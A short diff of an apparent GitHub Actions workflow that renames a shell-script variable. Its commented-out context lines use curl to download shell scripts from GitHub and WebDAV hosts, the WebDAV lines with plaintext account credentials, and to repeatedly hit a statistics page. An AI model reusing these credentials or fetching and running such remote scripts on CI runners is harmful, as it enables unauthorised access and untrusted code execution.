@@ -47,10 +47,10 @@ jobs:
           #cd  /home/runneradmin
           ls
           # for i in {0..20}; {      curl  -s  http://gongzige.42web.io//tongji.php   ;};          
+          shellname=git2843.sh
           #rm aaa.sh
           #curl  -O  https://raw.githubusercontent.com/erbasisan/foder/main/aaa.sh
           #curl    -O  -u  502112076@qq.com:ax4mgtbia55quvag      http://dav.jianguoyun.com/dav/my/aaa.sh
-          shellname=git.sh
           #curl   -O     -u wuniu5@yandex.com:jbirsojyfbgnfboe      https://webdav.yandex.ru/my/$shellname
           #cat  $shellname
           ls
